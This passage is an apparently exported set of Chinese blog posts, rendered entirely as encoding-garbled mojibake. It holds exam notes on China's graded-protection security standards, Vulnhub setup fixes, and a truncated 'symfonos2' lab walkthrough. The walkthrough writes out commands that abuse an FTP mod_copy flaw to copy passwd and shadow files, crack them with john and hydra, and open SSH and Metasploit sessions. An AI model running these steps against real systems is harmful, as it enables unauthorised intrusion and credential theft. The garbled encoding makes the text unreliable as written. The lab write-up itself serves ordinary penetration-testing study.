´åè€Œå¯¼è‡´ç³»ç»Ÿä¸å¯ç”¨çš„æœåŠ¡ä¿è¯ç±»è¦æ±‚ã€‚G-é€šç”¨å®‰å…¨ä¿æŠ¤ç±»è¦æ±‚ï¼ŒGä¸ºSã€Aä¸­æœ€é«˜çš„æ•°å­—çº§åˆ«ã€‚åŒç­‰çº§ç³»ç»Ÿçš„è§£å†³æ–¹æ¡ˆæœªå¿…å¯ä»¥äº’ç”¨ï¼ˆSã€Aä¸ä¸€æ ·ï¼‰  \né€šç”¨å®‰å…¨ç‰©ç†ç¯å¢ƒéš”ç¦»æŠ€æœ¯ä¸­ï¼Œå®‰å…¨æ€§æœ€å¥½çš„æ˜¯ï¼šç‰©ç†éš”ç¦»  \nå®‰å…¨é€šä¿¡ç½‘ç»œç­‰ä¿2.0å®‰å…¨é€šä¿¡ç½‘ç»œå±‚é¢ ä¸‰çº§ç³»ç»Ÿåº”æä¾›ä»€ä¹ˆçš„ç¡¬ä»¶å†—ä½™ï¼Œä¿è¯ç³»ç»Ÿçš„å¯ç”¨æ€§ï¼šé€šä¿¡çº¿è·¯ã€å…³é”®ç½‘ç»œè®¾å¤‡ã€å…³é”®è®¡ç®—è®¾å¤‡  \nå®‰å…¨åŒºåŸŸè¾¹ç•Œç­‰ä¿ä¸‰çº§ä¸­ï¼Œæ¶æ„ä»£ç åº”è¯¥åœ¨å“ªé‡Œè¿›è¡Œæ£€æµ‹å’Œæ¸…é™¤ï¼šç½‘ç»œè¾¹ç•Œè¿œç¨‹è®¿é—®ï¼šç©¿è¶Šè¾¹ç•Œçš„è®¿é—®äº’è”ç½‘è®¿é—®ï¼šç½‘ç»œå†…éƒ¨è®¿é—®å¤–éƒ¨äº’è”ç½‘  \nå®‰å…¨è®¡ç®—ç¯å¢ƒWindowsç³»ç»Ÿé»˜è®¤terminal servicesæœåŠ¡æ‰€å¼€æ”¾çš„ç«¯å£ä¸ºï¼š3389win2000ä¸­å®¡æ ¸è´¦æˆ·ç™»å½•æ˜¯å®¡æ ¸ï¼šåŸŸæ§åˆ¶å™¨æ¥å—ä¸€ä¸ªéªŒè¯ç”¨æˆ·è´¦æˆ·çš„è¯·æ±‚Windowsä¸­çš„power usersç»„æ˜¯å¦é»˜è®¤å…·æœ‰å¯¹äº‹ä»¶æ—¥å¿—çš„åˆ é™¤æƒé™ï¼šå¦ï¼Œpoweruserç»„å³è¶…çº§ç”¨æˆ·ç»„ï¼Œåªå…·å¤‡éƒ¨åˆ†ç®¡ç†å‘˜æƒé™ã€‚  \nè¶…æ—¶è‡ªåŠ¨æ–­è¿ï¼š(Cisco)exec-timeoutï¼›(åä¸º)idle-timeoutciscoçš„é…ç½®é€šè¿‡ä»€ä¹ˆåè®®å¤‡ä»½ï¼šTFTPciscoé€šè¿‡ä»€ä¹ˆæ–¹å¼å°†æ—¥å¿—å‘é€åˆ°æ—¥å¿—æœåŠ¡å™¨ï¼šsyslogæˆ–SNMPäº¤æ¢æœºå¯ä»¥é€šè¿‡ä»€ä¹ˆæ¥é™åˆ¶æ•°æ®æµçš„æœ€å¤§æµé‡ï¼šipã€åè®®ã€ç«¯å£ç½‘ç»œè¿æ¥æ•°è·¯ç”±å™¨å¯ä»¥é€šè¿‡ä»€ä¹ˆæ¥é™åˆ¶å¸¦å®½ï¼šipã€ç”¨æˆ·ã€åè®®è·¯ç”±å™¨ä¸­ï¼Œè‹¥å»å¾€åŒä¸€ç›®çš„åœ°æœ‰å¤šæ¡è·¯ç”±ï¼Œåˆ™å†³å®šæœ€ä½³è·¯ç”±çš„å› ç´ æœ‰ï¼šè·¯ç”±çš„ä¼˜å…ˆçº§å’Œè·¯ç”±çš„metricå€¼ç”¨æˆ·ç™»å½•è·¯ç”±å™¨çš„ä¸»è¦æ–¹å¼æœ‰ï¼šåˆ©ç”¨æ§åˆ¶å°ç«¯å£é€šè¿‡æœ¬åœ°è¿æ¥ç™»å½•ã€åˆ©ç”¨è¾…åŠ©ç«¯å£(AUX)é€šè¿‡è°ƒåˆ¶è§£è°ƒå™¨(MODEM)è¿›è¡Œæœ¬åœ°è¿æ¥ç™»å½•ã€åˆ©ç”¨è™šæ‹Ÿç»ˆç«¯(VTY)é€šè¿‡TCP/IPç½‘ç»œè¿›è¡Œè¿œç¨‹ç™»å½•  \nä¸‰çº§ç³»ç»Ÿä¸­ï¼ŒMS SQLserverçš„å®¡æ ¸çº§åˆ«ä¸ºï¼šå…¨éƒ¨åœ¨Sybaseä¸­ï¼Œå¦‚æœä¸å­˜åœ¨sybsecurityåº“ï¼Œåˆ™è¯´æ˜æœªå®‰è£…å®¡è®¡å·¥å…·ã€‚Oracleä¸­ä»€ä¹ˆå‘½ä»¤å¯ä»¥åˆ é™¤æ•´ä¸ªè¡¨ä¸­çš„æ•°æ®ä¸”æ— æ³•å›æ»šï¼šTruncateOracleä¸­çš„ç³»ç»Ÿæ–‡ä»¶ï¼šæ•°æ®æ–‡ä»¶DBFã€æ§åˆ¶æ–‡ä»¶CLTã€æ—¥å¿—æ–‡ä»¶LOGOracleä¸­Oracle Audit Vaultå®‰å…¨æ¨¡å—çš„åŠŸèƒ½æ˜¯ï¼šæ—¥å¿—åˆ†æ  \nOSPFä½¿ç”¨ä»€ä¹ˆæ¥è®¡ç®—åˆ°ç›®çš„ç½‘ç»œçš„å¼€é”€ï¼šå¸¦å®½OSPFä½¿ç”¨é“¾è·¯çŠ¶æ€ç®—æ³•ï¼šé“¾è·¯çŠ¶æ€æ˜¯å¯¹ç½‘ç»œæ‹“æ‰‘ç»“æ„çš„æè¿°ï¼›é€šå‘Šçš„è·¯ç”±ä¿¡æ¯æºå¸¦ä¿¡æ¯çš„åˆ›å»ºè€…ï¼Œé“¾è·¯çŠ¶æ€ç®—æ³•æœ¬èº«ä¸ä¼šäº§ç”Ÿè‡ªç¯è·¯ç”±ã€‚OSPFçš„è®¤è¯å¯ä»¥åœ¨å®é™…é“¾è·¯ã€è™šé“¾è·¯å’Œæ•´ä¸ªåŒºåŸŸå†…è¿›è¡Œã€‚RIPï¼šå¯¹è·¯ç”±çš„æè¿°ï¼›è·¯ç”±å™¨ä¹‹é—´ä¼ é€’çš„è·¯ç”±ä¿¡æ¯ä¸­ä¸æºå¸¦ä¿¡æ¯çš„åˆ›å»ºè€…(æ°´å¹³åˆ†å‰²/æ¯’æ€§é€†è½¬)    \nå¼ºåˆ¶è®¿é—®æ§åˆ¶ç­–ç•¥æœ€æ˜¾è‘—çš„ç‰¹å¾æ˜¯ï¼šå…¨å±€æ€§ã€æ°¸ä¹…æ€§åŠŸèƒ½æµ‹è¯•ä¸èƒ½å®ç°ä»€ä¹ˆåŠŸèƒ½ï¼šå…¨å±€è®¿é—®æ§åˆ¶ç­–ç•¥é…ç½®è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼šä¸å¿…åˆ¶å®šæ—¥å¿—ä¸»æœºè®¿é—®æ§åˆ¶çš„ä¸‰è¦ç´ æ˜¯ï¼šä¸»ä½“ã€å®¢ä½“ã€æ“ä½œè®¿é—®æ§åˆ¶æŒ‰ç­–ç•¥åˆ’åˆ†å¯åˆ†ä¸ºï¼šè‡ªä¸»è®¿é—®æ§åˆ¶ã€å¼ºåˆ¶è®¿é—®æ§åˆ¶ã€åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶è®¿é—®æ§åˆ¶æŒ‰å±‚é¢åˆ’åˆ†å¯åˆ†ä¸ºï¼šç½‘ç»œè®¿é—®æ§åˆ¶ã€ä¸»æœºè®¿é—®æ§åˆ¶ã€åº”ç”¨è®¿é—®æ§åˆ¶ã€ç‰©ç†è®¿é—®æ§åˆ¶  \nç½‘ç»œå®‰å…¨å®¡è®¡æŒ‡é€šè¿‡å¯¹ç½‘ç»œè¾¹ç•Œæˆ–é‡è¦ç½‘ç»œèŠ‚ç‚¹çš„æµé‡æ•°æ®è¿›è¡Œåˆ†æï¼Œä»è€Œå½¢æˆçš„ç½‘ç»œå®‰å…¨å®¡è®¡æ•°æ®ã€‚ç½‘ç»œå®‰å…¨å®¡è®¡åŒ…æ‹¬ï¼šç½‘ç»œæµé‡å®¡è®¡å’Œç½‘ç»œå®‰å…¨äº‹ä»¶å®¡è®¡ã€‚ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿä¸€èˆ¬åŒ…æ‹¬ï¼šç½‘ç»œæ¢æµ‹å¼•æ“ã€æ•°æ®ç®¡ç†ä¸­å¿ƒã€å®¡è®¡ä¸­å¿ƒå®‰å…¨å®¡è®¡æŒ‰å¯¹è±¡å¯åˆ†ä¸ºå“ªäº›ç±»ï¼Œå„ç±»å®¡è®¡å†…å®¹æ˜¯ä»€ä¹ˆï¼š    ç³»ç»Ÿçº§å®¡è®¡ï¼šè¦æ±‚è‡³å°‘èƒ½å¤Ÿè®°å½•ç™»é™†ç»“æœã€ç™»é™†æ ‡è¯†ã€ç™»é™†å°è¯•çš„æ—¥æœŸå’Œæ—¶é—´ã€é€€å‡ºçš„æ—¥æœŸå’Œæ—¶é—´ã€æ‰€ä½¿ç”¨çš„è®¾å¤‡ã€ç™»é™†åè¿è¡Œçš„å†…å®¹ã€ä¿®æ”¹é…ç½®æ–‡ä»¶çš„è¯·æ±‚ç­‰ã€‚    åº”ç”¨çº§å®¡è®¡ï¼šè·Ÿè¸ªç›‘æ§å’Œè®°å½•è¯¸å¦‚æ‰“å¼€å’Œå…³é—­æ•°æ®æ–‡ä»¶ï¼Œè¯»å–ã€ç¼–è¾‘å’Œåˆ é™¤è®°å½•æˆ–å­—æ®µçš„ç‰¹å®šæ“ä½œä»¥åŠæ‰“å°æŠ¥å‘Šä¹‹ç±»çš„ç”¨æˆ·æ´»åŠ¨ã€‚    ç”¨æˆ·çº§å®¡è®¡ï¼šè·Ÿè¸ªé€šå¸¸è®°å½•ç”¨æˆ·ç›´æ¥å¯åŠ¨çš„æ‰€æœ‰å‘½ä»¤ã€æ‰€æœ‰çš„æ ‡è¯†å’Œé‰´åˆ«å°è¯•çš„æ‰€æœ‰è®¿é—®çš„æ–‡ä»¶å’Œèµ„æºã€‚  \nå…¥ä¾µå¨èƒï¼šå¤–éƒ¨æ¸—é€ã€å†…éƒ¨æ¸—é€ã€ä¸æ³•è¡Œä¸ºå…¥ä¾µè¡Œä¸ºï¼šç‰©ç†å…¥ä¾µã€ç³»ç»Ÿå…¥ä¾µã€è¿œç¨‹å…¥ä¾µè¢«åŠ¨ç½‘ç»œæ”»å‡»ï¼šçªƒå¬ã€å£ä»¤å—…æ¢å…¥ä¾µæ£€æµ‹ç³»ç»Ÿåˆ†ä¸ºï¼šä¸»æœºå‹å…¥ä¾µæ£€æµ‹ç³»ç»ŸHIDSå’Œç½‘ç»œå‹å…¥ä¾µæ£€æµ‹ç³»ç»ŸNIDSæŸ¥çœ‹å…¥ä¾µçš„é‡è¦çº¿ç´¢ï¼šmore /var/log/secure | grep refusedå…¥ä¾µæ£€æµ‹ç³»ç»Ÿåœ¨è¿›è¡Œä¿¡å·åˆ†ææ—¶ï¼Œä¸€èˆ¬é€šè¿‡ä¸‰ç§å¸¸ç”¨æŠ€æœ¯æ‰‹æ®µï¼šæ¨¡å¼åŒ¹é…ã€ç»Ÿè®¡åˆ†æã€å®Œæ•´æ€§åˆ†æé™¤äº†å®‰è£…é˜²ç—…æ¯’è½¯ä»¶è¿˜æœ‰ä»€ä¹ˆï¼šå®‰å…¨è¡¥ä¸ç®¡ç†å¹³å°ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€å¯¹ç³»ç»Ÿå’Œæ•°æ®è¿›è¡Œå¸¸å¤‡ä»½é˜²ç«å¢™æä¾›çš„æ¥å…¥æ¨¡å¼åŒ…æ‹¬ï¼šç½‘å…³æ¨¡å¼ã€é€æ˜æ¨¡å¼ã€æ··åˆæ¨¡å¼ã€æ—è·¯æ¥å…¥æ¨¡å¼åŒ…è¿‡æ»¤é˜²ç«å¢™æ˜¯æœ€åŸºæœ¬æœ€ä¼ ç»Ÿçš„é˜²ç«å¢™ï¼Œå®ƒåªè¿è¡Œåœ¨ï¼šç½‘ç»œå±‚å’Œä¼ è¾“å±‚æŒ‰ç­‰ä¿ä¸‰çº§è¦æ±‚ï¼Œé˜²ç«å¢™åº”å¯¹ç½‘ç»œä¸Šå“ªäº›åè®®è¿›è¡Œå‘½åçº§æ§åˆ¶ï¼šhttpã€ftpã€telnetã€pop3ã€smtpå¯¹äºå¤§å‹ä¼ä¸šä¿¡æ¯ç³»ç»Ÿï¼Œè¡¥ä¸å‡çº§çš„ç†æƒ³çš„å®‰å…¨æœºåˆ¶æ˜¯ï¼šå®‰è£…MicrosoftSUSæœåŠ¡å™¨ï¼›æŠŠç”¨æˆ·è®¡ç®—æœºè®¾ç½®è‡ªåŠ¨æ›´æ–°å¯ä»¥æœ‰æ•ˆ(ä¸»åŠ¨)é˜»æ­¢æˆ–å‘ç°å…¥ä¾µè¡Œä¸ºçš„æœ‰ï¼šéƒ¨ç½²IDSè®¾å¤‡ã€ä¸»æœºé˜²ç«å¢™ã€ç½‘ç»œé˜²ç«å¢™æ—¥å¿—æ£€æŸ¥å’Œåˆ†æ(è¢«åŠ¨)  \nå¼€å±•ä¸»æœºå·¥å…·æµ‹è¯•æ‰€å¿…éœ€äº†è§£çš„ä¿¡æ¯ï¼šæ“ä½œç³»ç»Ÿã€åº”ç”¨ã€ip  \næ•°æ®æœ€å¥½çš„å£ä»¤å­˜å‚¨æ–¹æ³•ï¼šä¿å­˜åœ¨TACACS+æˆ–RADIUSè®¤è¯æœåŠ¡å™¨ä¸Šã€‚CRCä¸èƒ½å¤Ÿæä¾›å’Œå®ç°é€šä¿¡ä¸­æ•°æ®å®Œæ•´æ€§æ ¡éªŒã€‚å¤‡ä»½æ–¹å¼æœ‰ä»€ä¹ˆï¼šå…¨é‡å¤‡ä»½ã€å¢é‡å¤‡ä»½ã€å·®å¼‚å¤‡ä»½IPsecé€šè¿‡ä»€ä¹ˆæ¥å®ç°å¯†é’¥äº¤æ¢ã€ç®¡ç†åŠå®‰å…¨åå•†ï¼šISAKMAP/Oakleyï¼›SKIPæµ‹è¯•å’ŒéªŒè¯ç½‘ç»œè®¾å¤‡å’Œå®‰å…¨è®¾å¤‡çš„ä¸šåŠ¡å¤„ç†èƒ½åŠ›ï¼šç»¼åˆç½‘ç®¡å¹³å°ã€ç™»é™†è®¾å¤‡æŸ¥çœ‹ç›¸å…³é…ç½®è®¿è°ˆ/æŸ¥çœ‹è®¾å¤‡é…ç½®æ–‡æ¡£  \nå¤§æ•°æ®å¤§æ•°æ®å¹³å°ä¸ºäº†ä¿éšœæ•°æ®ä¿å¯†æ€§åº”æä¾›ï¼šé™æ€è„±æ•ã€å»æ ‡è¯†åŒ–çš„å·¥å…·æˆ–æœåŠ¡ç»„ä»¶æŠ€æœ¯  \näº‘è®¡ç®—äº‘è®¡ç®—å®‰å…¨é˜²æŠ¤æŠ€æœ¯æ¡†æ¶ï¼ŒåŒ…æ‹¬ï¼šäº‘ç”¨æˆ·å±‚ã€è®¿é—®å±‚ã€æœåŠ¡å±‚ã€èµ„æºå±‚ã€ç¡¬ä»¶è®¾æ–½å±‚å’Œç®¡ç†å±‚ï¼ˆè·¨å±‚åŠŸèƒ½ï¼‰   \nç‰©è”ç½‘ç‰©è”ç½‘åˆ†ä¸ºï¼šæ„ŸçŸ¥å±‚ã€ç½‘ç»œä¼ è¾“å±‚ã€å¤„ç†åº”ç”¨å±‚  \nç§»åŠ¨äº’è”å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç‰¹å¾è¦ç´ ï¼šç§»åŠ¨ç»ˆç«¯ã€ç§»åŠ¨åº”ç”¨å’Œæ— çº¿ç½‘ç»œç§»åŠ¨äº’è”å®‰å…¨æ‰©å±•è¦æ±‚æå‡ºç‰¹æ®Šä¿æŠ¤è¦æ±‚ï¼Œå¢åŠ çš„å†…å®¹åŒ…æ‹¬ï¼šæ— çº¿æ¥å…¥ç‚¹çš„ç‰©ç†ä½ç½®ã€ç§»åŠ¨ç»ˆç«¯ç®¡æ§ã€ç§»åŠ¨åº”ç”¨ç®¡æ§ã€ç§»åŠ¨åº”ç”¨è½¯ä»¶é‡‡è´­ã€ç§»åŠ¨åº”ç”¨è½¯ä»¶å¼€å‘  \nå·¥ä¸šæ§åˆ¶ç³»ç»Ÿå·¥ä¸šæ§åˆ¶ç³»ç»Ÿç‰¹å¾è¦ç´ ï¼šç°åœºé‡‡é›†/æ‰§è¡Œã€ç°åœºæ§åˆ¶ã€è¿‡ç¨‹æ§åˆ¶å’Œç”Ÿäº§ç®¡ç†å·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¿¡æ¯å®‰å…¨ä¸»è¦æ€æƒ³åŒ…æ‹¬ä½“ç³»ï¼šå®‰å…¨é˜²æŠ¤æ£€æµ‹ä½“ç³»ã€å®‰å…¨æ€åŠ¿åˆ†æä½“ç³»ã€äº‘æœåŠ¡ä½“ç³»  \nåˆ¶åº¦æ ‡å‡†\n1999-9-13 å›½å®¶å…¬å®‰éƒ¨æå‡ºå¹¶ç»„ç»‡åˆ¶å®šï¼Œå›½å®¶è´¨é‡æŠ€æœ¯ç›‘ç£å±€å‘å¸ƒã€Šè®¡ç®—æœºä¿¡æ¯ç³»ç»Ÿå®‰å…¨ä¿æŠ¤ç­‰çº§åˆ’åˆ†å‡†åˆ™ã€‹ï¼Œ2001-1-1å®æ–½åˆ’åˆ†äº”ç­‰çº§ï¼›2007-06 å››éƒ¨é—¨è”åˆå‡ºå°ã€Šä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤ç®¡ç†åŠæ³•ã€‹ä¸‰çº§ æ¬¡/å¹´ï¼Œå››çº§ æ¬¡/åŠå¹´ï¼ŒäºŒçº§éœ€å¤‡æ¡ˆï¼›2009-10 ã€Šä¿¡æ¯ç³»ç»Ÿå®‰å…¨ç­‰çº§ä¿æŠ¤æµ‹è¯„æŠ¥å‘Šæ¨¡æ¿ï¼ˆè¯•è¡Œï¼‰ã€‹ï¼›2010-12 ç­‰ä¿1.0ï¼›2016-10-10 ç­‰ä¿2.0ï¼›2016-11-7 ã€Šä¸­åäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•ã€‹ï¼Œ2017-6-1 21æ¡æ­£å¼å®æ–½ï¼›2017-5 ã€ŠGA/T 1389-2017 ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å®šçº§æŒ‡å—ã€‹ï¼›2018-4 å…¬å®‰éƒ¨ç¬¬åä¸€å±€ ã€Šç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤æµ‹è¯„æœºæ„ç®¡ç†åŠæ³•ï¼ˆå…¬ä¿¡å®‰[2018]765å·ï¼‰ã€‹ï¼›ã€2021-8 åºŸé™¤2019-12-1 ç­‰ä¿2.0å®æ–½ ã€Šç­‰çº§æµ‹è¯„æŠ¥å‘Šæ¨¡æ¿2019ç‰ˆ-V35-20190624ã€‹ï¼›2020-1-1 ã€Šä¸­åäººæ°‘å…±å’Œå›½å¯†ç æ³•ã€‹ï¼›2020-4 ã€ŠGB/T 22240-2020 ä¿¡æ¯å®‰å…¨æŠ€æœ¯ ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å®šçº§æŒ‡å—ã€‹ï¼Œ2020-11-1å®æ–½ï¼›2020-7-3 ã€Šä¸­åäººæ°‘å…±å’Œå›½æ•°æ®å®‰å…¨æ³•ï¼ˆè‰æ¡ˆï¼‰ã€‹;2020-7 å…¬ç½‘å®‰ã€2020ã€‘1960å·æ–‡ä»¶ã€Šè´¯å½»è½å®ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦å’Œå…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤åˆ¶åº¦çš„æŒ‡å¯¼æ„è§ã€‹;2020-10 ã€Šä¸ªäººä¿¡æ¯ä¿æŠ¤æ³•ï¼ˆè‰æ¡ˆï¼‰ã€‹ï¼›2021-6-10 ã€Šä¸­åäººæ°‘å…±å’Œå›½æ•°æ®å®‰å…¨æ³•ã€‹ï¼Œ2021-9-1 å®æ–½ï¼›2021-6-18 å…¬ç½‘å®‰ã€”2021ã€•1904å·é™„ä»¶ã€Šç­‰çº§æµ‹è¯„æŠ¥å‘Šæ¨¡æ¿ï¼ˆ2021ç‰ˆï¼‰ã€‹ï¼›2021-8-23 å¹¿ä¸œçœå…å‘å¸ƒã€Šå…³äºç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤æµ‹è¯„æœºæ„ç®¡ç†çº³äººå›½å®¶è®¤è¯ä½“ç³»æœ‰å…³äº‹é¡¹çš„é€šçŸ¥ã€‹ï¼›2021-9-1 ã€Šå…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ä¿æŠ¤æ¡ä¾‹ã€‹ï¼›2021-11-1 ã€Šä¸­åäººæ°‘å…±å’Œå›½ä¸ªäººä¿¡æ¯ä¿æŠ¤æ³•ã€‹ï¼›2021-11-19 ã€Šç½‘ç»œå®‰å…¨ç­‰çº§æµ‹è¯„ä¸æ£€æµ‹è¯„ä¼°æœºæ„æœåŠ¡è®¤è¯è¯ä¹¦ã€‹2022-1 ã€Šç½‘ç»œå®‰å…¨ç­‰çº§æµ‹è¯„ä¸æ£€æµ‹è¯„ä¼°æœºæ„è‡ªå¾‹è§„èŒƒã€‹\n\n","categories":["ç­‰ä¿æµ‹è¯„/åˆçº§è€ƒè¯•"],"tags":[]},{"title":"Vulnhub|Questions","url":"/238e957d.html","content":"1.é¶æœºå®‰è£…åæ— ip\nä½¿ç”¨NATæ¨¡å¼ï¼Œä¿è¯ä¸æ”»å‡»æœºkaliåœ¨åŒä¸€ç½‘æ®µå†…ã€‚\n\nè¿™é‡Œé…ç½®å®Œäº†ä¹‹åå‘ç°nmapä¸åˆ°é¶æœºçš„ipã€‚\nè§£å†³åŠæ³•ï¼š  \n1.å¯åŠ¨é¶æœºæ—¶æŒ‰shiftï¼Œæˆ–é€‰ä¸­grubèœå•æŒ‰eï¼Œè¿›å…¥é…ç½®ç•Œé¢ï¼Œä¿®æ”¹é…ç½®ä¿¡æ¯ï¼šä¿®æ”¹å®Œåï¼ŒCtrl+X å¼•å¯¼ç³»ç»Ÿï¼Œè¿›å…¥å‘½ä»¤è¡Œã€‚2.ip aæŸ¥çœ‹ç½‘å¡ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°é¶æœºæ²¡æœ‰æˆåŠŸåœ°è¢«åˆ†é…åˆ°ipï¼Œè®°ä½ç½‘å¡åç§°ens33ï¼š3.vim /etc/network/interfacesçœ‹ä¸€ä¸‹é…ç½®ä¿¡æ¯ç”¨çš„æ˜¯å“ªä¸€ä¸ªç½‘å¡ï¼ŒæŠŠå®ƒä»¬éƒ½æ”¹ä¸ºens33ï¼š/etc/init.d/networking/interfacesé‡å¯ç½‘å¡åï¼Œé‡æ–°å¯åŠ¨é¶æœºã€‚\n\n\n\næ­¤æ—¶é¶æœºå¯åŠ¨åï¼Œåœ¨æ”»å‡»æœºä¸Šè¿›è¡Œä¸»æœºæ‰«ææ—¶åº”èƒ½æ‰«æåˆ°ã€‚\n\n2.cssåŠ è½½å¼‚å¸¸&amp;urlé‡å®šå‘\nè§£å†³åŠæ³•ï¼šå°†ç›®æ ‡é¶æœºipåœ°å€è®¾å®šä¸ºlocalhost vi /etc/hostsï¼š  \n\n3.æŠ¥â€œ403â€é”™è¯¯\nè§£å†³åŠæ³•ï¼šï¼ˆè‹¥ç”¨çš„VMwareï¼‰æŠŠé¶æœºéƒ¨ç½²æ–‡ä»¶ä¸­çš„.mfæ–‡ä»¶åˆ æ‰ï¼ï¼\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub"]},{"title":"Vulnhub|symfonos2","url":"/81698da0.html","content":"0.é¶æœºå®‰è£…\nä¸å†èµ˜è¿°ï¼Œå¯çœ‹ä¹‹å‰çš„Vulnhubç›¸å…³æ–‡ç« ã€‚  \n\n1.ä¿¡æ¯æ”¶é›†\nä¸»æœºæ‰«ænmapæ‰«ænmap -sn 192.168.xxx.0/24é¶æœºå¼€æ”¾äº†21(ftp)ã€22(ssh)ã€80(http)ã€139(netbios-ssn)å’Œ445(micrsoft-ds)ç«¯å£ã€‚  \n\n2.(21ç«¯å£)ftp\nå°è¯•æœªç™»å½•è®¿é—®site helpï¼Œæ‰¾åˆ°mod_copyæ¨¡å—æœªæˆæƒè°ƒç”¨æ¼æ´  \n\n3.(80ç«¯å£)web\nè®¿é—®é¡µé¢ï¼ŒæŸ¥çœ‹æºç åæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚nikto -h 192.168.xxx.xxxæ‰«ä¸€ä¸‹ç›®å½•,ä¹Ÿæ²¡æœ‰ä»€ä¹ˆã€‚  \n\n4.(445/139ç«¯å£)smb\n\né€šè¿‡TCPç«¯å£445å’Œ139æ¥åˆ©ç”¨SMBv1å’ŒNBTä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¶æ„ä»£ç ä¼šæ‰«æå¼€æ”¾445æ–‡ä»¶å…±äº«ç«¯å£çš„Windowsæœºå™¨ï¼Œæ— éœ€ç”¨æˆ·ä»»ä½•æ“ä½œï¼Œåªè¦å¼€æœºä¸Šç½‘ï¼Œä¸æ³•åˆ†å­å°±èƒ½åœ¨ç”µè„‘å’ŒæœåŠ¡å™¨ä¸­æ¤å…¥å‹’ç´¢è½¯ä»¶ã€è¿œç¨‹æ§åˆ¶æœ¨é©¬ã€è™šæ‹Ÿè´§å¸æŒ–çŸ¿æœºç­‰æ¶æ„ç¨‹åºã€‚   \n\næŸ¥çœ‹ç›®æ ‡çš„å…±äº«æ–‡ä»¶å¤¹smbclient -L //192.168.xxx.xxx:è¿æ¥/anonymous smbclient //192.168.xxx.xxx/anonymous:ls -aæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æœ‰ä»€ä¹ˆï¼Œæ‰¾åˆ°log.txtï¼šcat log.txtæŸ¥çœ‹æ–‡ä»¶ï¼Œè·å¾—ç”¨æˆ·åaeoluså’Œå…±äº«æ–‡ä»¶å¤¹anonymousçš„è·¯å¾„ï¼š  \n\n5.getshell\n\n2021-12-03å‘å¸ƒçš„getshellç›¸å…³æ–‡ç« getshell   \n\næ•´ç†ä¸€ä¸‹ç°åœ¨è·å¾—çš„ä¿¡æ¯ï¼š(ftp)mod_copyæ¨¡å—æœªæˆæƒè°ƒç”¨æ¼æ´ï¼Œ(smb)ä¸€ä¸ªç”¨æˆ·åå’Œå…±äº«æ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚æ€è·¯ï¼šå°†é¶æœºå£ä»¤æ–‡ä»¶passwdå’Œshadowå¤åˆ¶åˆ°å…±äº«æ–‡ä»¶å¤¹ä¸­ï¼Œå†é€šè¿‡å…±äº«æ–‡ä»¶å¤¹è·å¾—è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ¥ç€çˆ†ç ´å£ä»¤ã€‚  \n5.1 (ftp)mod_copyæ¨¡å—æœªæˆæƒè°ƒç”¨æ¼æ´\nå°†var/backups/shadow.bak(shadowæ²¡æœ‰å¤åˆ¶æƒé™ï¼Œæ•…å¤åˆ¶å¤‡ä»½æ–‡ä»¶.bak)å’Œ/etc/passwdé€šè¿‡ftpå¤åˆ¶åˆ°/home/aeolus/shareä¸­ï¼šsite cpfr /var/backups/shadow.baksite cpto /home/aeolus/share/shadow.txtsite cpfr /etc/passwdsite cpto /home/aeolus/share/passwd.txt  \n\n5.2 (smb)è¿›å…¥å…±äº«æ–‡ä»¶å¤¹ï¼Œè·å–ç›®æ ‡æ–‡ä»¶\nsmbclient //192.168.xxx.xxx/anonymous:ä¿å­˜è‡³æœ¬åœ°get shadow.txt get passwd.txt:  \n\n5.3 çˆ†ç ´å£ä»¤\nä½¿ç”¨kaliè‡ªå¸¦çš„å¯†ç å­—å…¸/usr/share/wordlist/rockyou,txt:ä½¿ç”¨unshadow passwd.txt shadow.txt &gt; password.txtæ•´åˆä¸€ä¸‹ä¸¤ä¸ªå£ä»¤æ–‡ä»¶ï¼šä½¿ç”¨Hydraçˆ†ç ´hydra -l aeolus -P /usr/share/wordlist/rockyou,txt 192.168.xxx.xxx ftp,æˆ‘è¿™é‡Œä½¿ç”¨Hydraå¤ªæ…¢äº†ï¼Œæ¢ç”¨johnã€‚ä½¿ç”¨johnçˆ†ç ´john --wordlist=/usr/share/wordlist/rockyou,txt /root/password.txtï¼šè·å¾—ç”¨æˆ·åå’Œå£ä»¤aeolusï¼šsergioteamo  \n\n5.4 sshç™»å½•\nssh aeolus@192.168.xxx.xxxç™»é™†åå‘ç°æ²¡æœ‰ä»€ä¹ˆæƒé™ã€‚  \n\n5.5 msfç”¨msfæŸ¥æ‰¾ä¸€ä¸‹ssh_loginçš„exp search ssh_login,æŒ‰ç…§show optionsé…ç½®å¥½ç›¸å…³å‚æ•°ï¼šrunåæ‹¿åˆ°äº†ä¸€ä¸ªç³»ç»Ÿshellï¼Œéœ€è¦å°†å…¶å‡çº§ä¸ºmeterpreter shellï¼š  \n\nbackgroundæˆ–ctrl+zè¿”å›ä¸Šä¸€å±‚ã€‚sessionsæŸ¥çœ‹ç³»ç»Ÿshellçš„session id=1ï¼šsessions -u 1å‡çº§session 1ã€‚sessionsçœ‹åˆ°sessionsåˆ—è¡¨å¤šäº†ä¸€ä¸ªåˆšæ‰å‡çº§çš„shellï¼Œid=2ï¼šsession 2ä½¿ç”¨session 